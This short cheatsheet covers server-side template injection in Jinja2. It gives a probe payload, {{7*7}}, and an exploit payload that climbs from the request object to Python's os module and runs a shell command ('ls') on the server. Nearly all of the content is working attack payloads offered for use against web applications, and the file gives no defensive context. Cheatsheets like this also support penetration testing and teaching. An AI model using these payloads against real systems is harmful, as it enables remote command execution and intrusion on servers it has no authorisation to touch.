# SSTI Cheatsheet (Jinja2-based)

## Test Payloads

- `{{7*7}}` → Should return `49` if SSTI is possible

## Exploit Payloads

- List files on server:
  `jinja2`
  {{request.application.__globals__.__builtins__.__import__('os').popen('ls').read()}}
